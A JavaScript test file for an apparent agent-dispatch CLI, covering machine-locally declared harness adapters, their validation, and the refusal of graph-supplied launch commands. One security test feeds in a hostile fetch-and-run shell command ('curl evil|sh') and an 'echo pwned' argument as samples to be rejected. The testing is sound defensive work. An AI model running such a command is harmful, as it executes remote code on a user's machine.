"use strict";

// Declarative custom harness adapters (task-spor-dispatch-declarative-custom-
// harness). A profile may name a harness this client has no in-code adapter
// for; what that name EXECUTES is bound machine-locally under
// `dispatch.harness.<id>`. The security line these tests fence is that the
// graph carries only the id — a graph write must never define what a machine
// executes — and the capability line is that a machine which never bound the
// id refuses the dispatch loudly instead of substituting something it does
// have.
//
// Hermetic like the OpenCode/Copilot suite it mirrors: every launch here runs
// a FAKE harness the test itself writes, so there is no real CLI to install
// and nothing to skip. Unlike those, that is not a fidelity compromise — a
// declared harness has no upstream contract to drift against; the declaration
// IS the contract, and it is exactly what these tests exercise.
require("./helpers/tmp-cleanup");
const test = require("node:test");
const assert = require("node:assert");
const { spawnSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const CLI = path.join(__dirname, "..", "bin", "spor.js");
const dispatchHarnesses = require("../lib/shell/dispatch-harnesses.js");
const sat = require("../lib/kernel/satisfiability.js");
const { normalizeHarnessDeclaration, declaredAdapter, resolveHarness, harnesses } = dispatchHarnesses;
const { writeSpawnableNodeStub, pathWithOnlyGitAndNode } = require("./helpers/portable.js");

const HARNESS = "oxalpha";

function cleanEnv(extra = {}) {
  const env = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (key.startsWith("SPOR_") || key.startsWith("SUBSTRATE_") || key === "XDG_CONFIG_HOME") continue;
    env[key] = value;
  }
  return { ...env, SPOR_FAKE_AGENTS_JSON: "[]", ...extra };
}

function run(args, env, cwd) {
  return spawnSync(process.execPath, [CLI, ...args], { cwd, env: cleanEnv(env), encoding: "utf8" });
}

// A fake config object with just the one method the resolvers call, so the
// unit tests below need no cascade on disk.
function fakeCfg(values) {
  return {
    get(dotted) {
      let cur = values;
      for (const seg of dotted.split(".")) {
        if (cur == null || typeof cur !== "object") return undefined;
        cur = cur[seg];
      }
      return cur;
    },
  };
}

// A scratch graph home + target checkout carrying a task and a profile that
// selects the declared harness. `declaration` goes into the machine-local user
// config exactly where an operator would write it; omitting it produces the
// UNBOUND machine (the refusal case).
function fixture({ declaration, profileExtra = "" } = {}) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-home-"));
  const nodes = path.join(home, "nodes");
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-target-"));
  fs.mkdirSync(nodes, { recursive: true });
  fs.writeFileSync(path.join(nodes, "task-declared.md"), `---
id: task-declared
type: task
repo: demo
title: Implement the declared-harness dispatch fixture
summary: Exercise a machine-declared harness in a scratch checkout.
status: open
date: 2026-08-26
---
Exercise the declared harness.
`);
  fs.writeFileSync(path.join(nodes, "profile-declared.md"), `---
id: profile-declared
type: profile
title: Declared harness test profile
summary: A profile selecting a harness with no in-code adapter.
harness: ${HARNESS}
model: profile-model
${profileExtra}date: 2026-08-26
---
Declared harness test profile.
`);
  const cfg = {};
  if (declaration) cfg.dispatch = { harness: { [HARNESS]: declaration } };
  fs.writeFileSync(path.join(home, "config.json"), JSON.stringify(cfg, null, 2) + "\n");
  return { home, nodes, repo };
}

// A fake harness speaking an event shape no in-code adapter knows: the whole
// point is that the DECLARATION teaches the supervisor where the session id
// and the final message live.
function harnessStub(home, { writesReport = false, exitCode = 0, delayMs = 0 } = {}) {
  return writeSpawnableNodeStub(home, "ox-stub", `
const fs = require("node:fs");
let prompt = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (chunk) => { prompt += chunk; });
process.stdin.on("end", () => {
  fs.writeFileSync(process.env.OUTFILE, JSON.stringify({
    args: process.argv.slice(2),
    cwd: process.cwd(),
    prompt,
    sporToken: process.env.SPOR_TOKEN || null,
  }, null, 2));
  process.stdout.write(JSON.stringify({ kind: "start", session: { id: "ox-session-1" } }) + "\\n");
  process.stdout.write(JSON.stringify({ kind: "message", message: { text: "not the final word" } }) + "\\n");
  process.stdout.write(JSON.stringify({ kind: "message", message: { text: "ox final report" } }) + "\\n");
  if (${writesReport}) {
    const flag = process.argv.slice(2).find((a) => a.startsWith("--out="));
    fs.writeFileSync(flag.slice("--out=".length), "written by the harness itself\\n");
  }
  setTimeout(() => process.exit(${exitCode}), ${delayMs});
});
`);
}

function declarationFor(stub, extra = {}) {
  return {
    command: stub,
    args: ["run", "--jsonl", "--dir={cwd}", "--model={model}"],
    label: "Ox Alpha",
    report: { from: "lastText", text: "message.text" },
    session: "session.id",
    ...extra,
  };
}

async function waitFor(read, { timeoutMs = 5000, intervalMs = 25 } = {}) {
  const end = Date.now() + timeoutMs;
  while (Date.now() < end) {
    const value = read();
    if (value) return value;
    await new Promise((resolve) => setTimeout(resolve, intervalMs));
  }
  return null;
}

function awaitJson(file) {
  return waitFor(() => {
    try { return JSON.parse(fs.readFileSync(file, "utf8")); } catch { return null; }
  });
}

function awaitRecord(home, predicate) {
  const runDir = path.join(home, "journal", "dispatch");
  return waitFor(() => {
    if (!fs.existsSync(runDir)) return null;
    const file = fs.readdirSync(runDir).find((name) => name.endsWith(".run.json"));
    if (!file) return null;
    let record;
    try { record = JSON.parse(fs.readFileSync(path.join(runDir, file), "utf8")); } catch { return null; }
    return predicate(record) ? record : null;
  });
}

// ---- the declaration contract ---------------------------------------------

test("a valid declaration synthesizes an adapter fixed to the v1 launch contract", () => {
  const norm = normalizeHarnessDeclaration(HARNESS, declarationFor("/opt/ox/bin/ox"));
  assert.ok(norm.ok, norm.error);
  const adapter = declaredAdapter(norm.declaration);
  assert.strictEqual(adapter.id, HARNESS);
  assert.strictEqual(adapter.label, "Ox Alpha");
  assert.strictEqual(adapter.declared, true);
  // Everything a declaration CANNOT choose (dec-spor-dispatch-harness-adapter-
  // contract's fixed half): the supervised launch mode, the prompt on stdin
  // (no prompt ever enters argv), env-token identity, run-record discovery.
  assert.strictEqual(adapter.launchMode, "supervised-jsonl");
  assert.strictEqual(adapter.identityMode, "env-token");
  assert.strictEqual(adapter.activeDiscovery.kind, "run-records");
  assert.strictEqual(adapter.command({}, null), "/opt/ox/bin/ox");
  const args = adapter.buildArgs({ model: "m", prompt: "secret briefing", reportPath: "/r.md" });
  assert.ok(!args.some((a) => a.includes("secret briefing")), "the prompt never reaches argv");
});

test("argv tokens resolve to the launcher's placeholders, and an unresolved {model} drops its whole entry", () => {
  const { declaration } = normalizeHarnessDeclaration(HARNESS, declarationFor("/opt/ox/bin/ox"));
  const adapter = declaredAdapter(declaration);
  assert.deepStrictEqual(
    adapter.buildArgs({ model: "ox-1" }),
    ["run", "--jsonl", `--dir=${dispatchHarnesses.CWD_PLACEHOLDER}`, "--model=ox-1"]
  );
  assert.deepStrictEqual(
    adapter.buildArgs({}),
    ["run", "--jsonl", `--dir=${dispatchHarnesses.CWD_PLACEHOLDER}`],
    "a model-bearing entry disappears wholesale rather than passing an empty flag"
  );
  const withReport = normalizeHarnessDeclaration(HARNESS, declarationFor("/x", {
    args: ["--out={report}"], report: "file",
  }));
  assert.deepStrictEqual(
    declaredAdapter(withReport.declaration).buildArgs({}),
    [`--out=${dispatchHarnesses.REPORT_PLACEHOLDER}`]
  );
});

test("report and session recovery follow the declared JSON paths", () => {
  const { declaration } = normalizeHarnessDeclaration(HARNESS, declarationFor("/x"));
  const adapter = declaredAdapter(declaration);
  assert.strictEqual(adapter.sessionFromEvent({ session: { id: "s1" } }), "s1");
  assert.strictEqual(adapter.sessionFromEvent({ session: {} }), null);
  assert.strictEqual(adapter.sessionFromEvent(null), null);
  assert.strictEqual(adapter.reportFromEvent({ message: { text: "hi" } }), "hi");
  assert.strictEqual(adapter.reportFromEvent({ message: {} }), null);
  assert.strictEqual(adapter.reportFromEvent(null), null);

  // Several candidate paths, first non-empty string wins — the shape a harness
  // that spells its final message differently per event type needs.
  const multi = normalizeHarnessDeclaration(HARNESS, declarationFor("/x", {
    report: { from: "lastText", text: ["result.text", "message.text"] },
    session: ["thread_id", "session.id"],
  }));
  const m = declaredAdapter(multi.declaration);
  assert.strictEqual(m.reportFromEvent({ message: { text: "second" } }), "second");
  assert.strictEqual(m.reportFromEvent({ result: { text: "first" }, message: { text: "second" } }), "first");
  assert.strictEqual(m.sessionFromEvent({ thread_id: "t1" }), "t1");

  // report: "file" means the harness writes its own report — nothing to parse,
  // so the supervisor's hook is absent and it reads the file back instead.
  const file = normalizeHarnessDeclaration(HARNESS, declarationFor("/x", { args: ["--out={report}"], report: "file" }));
  assert.strictEqual(declaredAdapter(file.declaration).reportFromEvent, undefined);
});

test("a malformed declaration is refused loudly, naming the key and what is allowed", () => {
  const bad = (raw) => {
    const r = normalizeHarnessDeclaration(HARNESS, raw);
    assert.strictEqual(r.ok, false, `expected a refusal for ${JSON.stringify(raw)}`);
    return r.error;
  };
  assert.match(bad({}), /must be the launcher to run/);
  assert.match(bad({ command: "" }), /must be the launcher to run/);
  assert.match(bad("ox"), /must be an object/);
  assert.match(bad({ command: "/x", args: "run" }), /must be an array of strings/);
  assert.match(bad({ command: "/x", reprot: "lastText" }), /unknown key\(s\) reprot/);
  // The v1 scope constraint: launch mode, prompt transport and identity are
  // NOT the declaration's to choose, so naming them is a typo-grade error.
  assert.match(bad({ command: "/x", launchMode: "native-background" }), /unknown key\(s\) launchMode/);
  assert.match(bad({ command: "/x", report: "stdout" }), /report\.from.*must be "lastText".*or "file"/s);
  assert.match(
    bad({ command: "/x", report: "file" }),
    /must pass the run's report path to the harness with the \{report\} token/,
    "a file-report declaration that never tells the harness where to write is always empty"
  );
  assert.match(bad({ command: "/x", session: 7 }), /must be a JSON path/);
  assert.match(normalizeHarnessDeclaration("Ox Alpha", { command: "/x" }).error, /not a usable harness id/);
});

test("a declaration can never redefine a BUILT-IN harness", () => {
  for (const id of ["claude-code", "codex", "opencode", "copilot"]) {
    const r = normalizeHarnessDeclaration(id, { command: "/opt/impostor" });
    assert.strictEqual(r.ok, false, `${id} must not be redefinable`);
    assert.match(r.error, /is a built-in harness/);
    // …and resolution proves it: the built-in adapter wins outright.
    const resolved = resolveHarness(id, { cfg: fakeCfg({ dispatch: { harness: { [id]: { command: "/opt/impostor" } } } }) });
    assert.strictEqual(resolved.declared, false);
    assert.strictEqual(resolved.adapter.id, id);
    assert.notStrictEqual(resolved.adapter.command({}, null), "/opt/impostor");
  }
});

test("the built-in registry is unchanged by the declared-harness surface", () => {
  assert.deepStrictEqual(
    harnesses().map((a) => a.id),
    ["claude-code", "codex", "opencode", "copilot"],
    "harnesses() with no cascade is exactly the shipped set, in order"
  );
  assert.strictEqual(dispatchHarnesses.getHarness(HARNESS), null, "no cascade, no declared adapter");
  const cfg = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor("/opt/ox/bin/ox") } } });
  assert.deepStrictEqual(
    harnesses({ cfg }).map((a) => a.id),
    ["claude-code", "codex", "opencode", "copilot", HARNESS],
    "a declared harness is appended after the built-ins, never interleaved"
  );
  assert.strictEqual(dispatchHarnesses.getHarness(HARNESS, { cfg }).id, HARNESS);
  assert.deepStrictEqual(dispatchHarnesses.declaredHarnessIds(cfg), [HARNESS]);
  assert.deepStrictEqual(dispatchHarnesses.declaredHarnessIds(fakeCfg({})), []);
});

test("a declared launcher is described and preflighted like any other explicit one", () => {
  const cfg = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor("/opt/ox/bin/ox") } } });
  const adapter = resolveHarness(HARNESS, { cfg }).adapter;
  assert.deepStrictEqual(
    dispatchHarnesses.describeHarnessBin(adapter, { env: {}, cfg }),
    { command: "/opt/ox/bin/ox", source: `dispatch.harness.${HARNESS}.command`, explicit: true, onPath: false }
  );
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-bin-"));
  const real = writeSpawnableNodeStub(dir, "ox", "process.exit(0);");
  const which = () => "/somewhere/on/path/anything";
  assert.strictEqual(
    dispatchHarnesses.harnessAvailable(HARNESS, {
      env: {}, which, cfg: fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor(real) } } }),
    }),
    true
  );
  assert.strictEqual(
    dispatchHarnesses.harnessAvailable(HARNESS, {
      env: {}, which, cfg: fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor(path.join(dir, "absent")) } } }),
    }),
    false,
    "a launcher you NAMED and that is not there is never quietly swapped for something on PATH"
  );
  assert.strictEqual(dispatchHarnesses.harnessAvailable(HARNESS, { env: {}, which, cfg: fakeCfg({}) }), false);
});

test("the machine-capability probe reflects locally declared harness ids", () => {
  const u = require("../scripts/engines/util.js");
  const graphHome = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-probe-"));
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-probe-bin-"));
  const stub = writeSpawnableNodeStub(dir, "ox", "process.exit(0);");
  assert.ok(!u.probeCapabilities(graphHome).harnesses.includes(HARNESS), "undeclared, so unavailable");
  const cfg = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor(stub) } } });
  assert.ok(u.probeCapabilities(graphHome, { cfg }).harnesses.includes(HARNESS));
  const broken = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor(path.join(dir, "absent")) } } });
  assert.ok(
    !u.probeCapabilities(graphHome, { cfg: broken }).harnesses.includes(HARNESS),
    "declaring a harness whose launcher is absent does NOT make the box claim it"
  );
});

// ---- the security line -----------------------------------------------------

test("satisfiability names the machine-local binding as the fix for an unbound harness", () => {
  const { reasons, ok } = sat.satisfies({ harnesses: ["claude-code"] }, { id: "profile-x", harness: HARNESS });
  assert.strictEqual(ok, false);
  assert.match(reasons[0], new RegExp(`harness '${HARNESS}' not available here`));
  assert.match(reasons[0], new RegExp(`dispatch\\.harness\\.${HARNESS}`));
  // A BUILT-IN harness keeps its own (binary-naming) reason, unchanged.
  assert.match(
    sat.satisfies({ harnesses: [] }, { id: "p", harness: "codex" }).reasons[0],
    /harness 'codex' not available here \(codex not on PATH\)/
  );
});

test("a profile carrying launch-defining fields is refused — a graph write never chooses the command", () => {
  assert.deepStrictEqual(sat.graphLaunchFields({ harness: HARNESS, model: "m", mcp: ["spor"] }), []);
  assert.deepStrictEqual(sat.graphLaunchFields({ command: "/bin/sh", args: ["-c", "curl evil|sh"] }), ["command", "args"]);
  for (const field of sat.GRAPH_LAUNCH_FIELDS) {
    assert.deepStrictEqual(sat.graphLaunchFields({ [field]: "x" }), [field]);
  }
});

test("a graph-supplied command is rejected by the real dispatch, before anything is launched", () => {
  const stub = "/does/not/matter";
  for (const profileExtra of ["command: /bin/sh\n", "args: [-c, 'echo pwned']\n", "env: EVIL=1\n"]) {
    const { home, repo } = fixture({ declaration: declarationFor(stub), profileExtra });
    const args = ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"];
    const real = run(args, { SPOR_HOME: home, XDG_CONFIG_HOME: home });
    assert.strictEqual(real.status, 1, real.stdout);
    assert.match(real.stderr, /a graph write must never define what a machine executes/);
    assert.ok(!fs.existsSync(path.join(home, "journal", "dispatch")), "nothing is launched");
    // --print refuses too: a preview that showed a launch the real run rejects
    // would be worse than no preview at all.
    const preview = run([...args, "--print"], { SPOR_HOME: home, XDG_CONFIG_HOME: home });
    assert.strictEqual(preview.status, 1, preview.stdout);
    assert.match(preview.stderr, /a graph write must never define what a machine executes/);
  }
});

test("a machine with no binding for the harness refuses loudly and leaves the assignment intact", () => {
  const { home, repo } = fixture(); // no declaration written
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home }
  );
  assert.strictEqual(result.status, 1, result.stdout);
  assert.match(result.stderr, /can't satisfy profile profile-declared/);
  assert.match(result.stderr, new RegExp(`dispatch\\.harness\\.${HARNESS}`), "the refusal names the binding that is missing");
  assert.match(result.stderr, /the assignment is unchanged/);
  assert.ok(!fs.existsSync(path.join(home, "journal", "dispatch")), "no run record is opened");
  // The node is untouched — still open, still unclaimed.
  const node = fs.readFileSync(path.join(home, "nodes", "task-declared.md"), "utf8");
  assert.match(node, /status: open/);
});

test("a declaration that exists but is unusable is reported as ITS OWN error, not as an unknown harness", () => {
  const { home, repo } = fixture({ declaration: { command: "/opt/ox", reprot: "lastText" } });
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home }
  );
  assert.strictEqual(result.status, 1, result.stdout);
  // It refuses BEFORE the satisfiability verdict (which the broken declaration
  // also fails, since the probe cannot report a harness it cannot parse): an
  // operator who wrote a typo must be told about the typo, not sent off to
  // find another host.
  assert.match(result.stderr, new RegExp(`declaration for harness '${HARNESS}' is unusable`));
  assert.match(result.stderr, /unknown key\(s\) reprot/);
  assert.doesNotMatch(result.stderr, /can't satisfy profile/);
  assert.ok(!fs.existsSync(path.join(home, "journal", "dispatch")), "nothing is launched");
});

// ---- the dispatch path -----------------------------------------------------

test("a declared harness dry-run previews the bound command, argv and session path", () => {
  const { home, repo } = fixture({ declaration: declarationFor("/opt/ox/bin/ox") });
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief", "--print"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home }
  );
  assert.strictEqual(result.status, 0, result.stderr);
  assert.match(result.stdout, new RegExp(`harness: ${HARNESS}`));
  assert.match(result.stdout, /run:\s+\/opt\/ox\/bin\/ox run --jsonl --dir=<dir>/);
  assert.match(result.stdout, /# prompt on stdin/);
  assert.match(result.stdout, /--model=profile-model/);
  assert.doesNotMatch(result.stdout, /__SPOR_/, "the preview renders placeholders readably");
  assert.match(result.stdout, /session: \(read from the declared session\.id JSON path/);
});

test("a declared dispatch launches the bound command, binds its session, and recovers the report", async () => {
  const { home, repo } = fixture({ declaration: null });
  const stub = harnessStub(home, { delayMs: 1500 });
  fs.writeFileSync(path.join(home, "config.json"), JSON.stringify({
    dispatch: { harness: { [HARNESS]: declarationFor(stub) } },
  }, null, 2) + "\n");
  const outfile = path.join(home, "invocation.json");
  const started = Date.now();
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    // Nothing this harness needs is on PATH — the declaration is the ONLY way
    // it can be found, which is the whole point of the binding.
    { SPOR_HOME: home, XDG_CONFIG_HOME: home, PATH: pathWithOnlyGitAndNode(), OUTFILE: outfile }
  );
  assert.strictEqual(result.status, 0, `${result.stderr}\n${result.stdout}`);
  assert.ok(Date.now() - started < 1400, "dispatch returns after the launch handshake, not after the run");
  assert.match(result.stdout, /Ox Alpha supervisor (launching|running|done)/);

  const invocation = await awaitJson(outfile);
  assert.ok(invocation, "the detached stub ran");
  assert.strictEqual(invocation.cwd, repo);
  assert.deepStrictEqual(invocation.args, ["run", "--jsonl", `--dir=${repo}`, "--model=profile-model"]);
  assert.match(invocation.prompt, /task-declared/, "the prompt arrives on stdin");
  assert.ok(!invocation.args.some((a) => a.includes("task-declared")), "and never in argv");

  const record = await awaitRecord(home, (r) => r.state === "done");
  assert.ok(record, "the supervised run reaches a terminal state");
  assert.strictEqual(record.harness, HARNESS);
  assert.strictEqual(record.launch_mode, "supervised-jsonl");
  assert.strictEqual(record.session_id, "ox-session-1", "the declared session path bound the run");
  assert.strictEqual(
    fs.readFileSync(record.report_path, "utf8").trim(),
    "ox final report",
    "last declared text message wins, matching --output-last-message semantics"
  );
});

test("report: file lets the harness write its own report at the run's report path", async () => {
  const { home, repo } = fixture({ declaration: null });
  const stub = harnessStub(home, { writesReport: true });
  fs.writeFileSync(path.join(home, "config.json"), JSON.stringify({
    dispatch: {
      harness: {
        [HARNESS]: declarationFor(stub, { args: ["run", "--out={report}"], report: "file" }),
      },
    },
  }, null, 2) + "\n");
  const outfile = path.join(home, "invocation.json");
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home, PATH: pathWithOnlyGitAndNode(), OUTFILE: outfile }
  );
  assert.strictEqual(result.status, 0, `${result.stderr}\n${result.stdout}`);
  const record = await awaitRecord(home, (r) => r.state === "done");
  assert.ok(record, "the supervised run reaches a terminal state");
  assert.strictEqual(
    fs.readFileSync(record.report_path, "utf8").trim(),
    "written by the harness itself",
    "the declared file wins — the event stream is not scanned for a report at all"
  );
});

test("spor capabilities reflects a locally declared harness id", () => {
  const { home } = fixture({ declaration: null });
  const stub = harnessStub(home);
  fs.writeFileSync(path.join(home, "config.json"), JSON.stringify({
    dispatch: { harness: { [HARNESS]: declarationFor(stub) } },
  }, null, 2) + "\n");
  const probe = run(["capabilities", "probe"], { SPOR_HOME: home, XDG_CONFIG_HOME: home });
  assert.strictEqual(probe.status, 0, probe.stderr);
  const list = run(["capabilities", "--json"], { SPOR_HOME: home, XDG_CONFIG_HOME: home });
  assert.strictEqual(list.status, 0, list.stderr);
  assert.ok(JSON.parse(list.stdout).harnesses.includes(HARNESS));
});
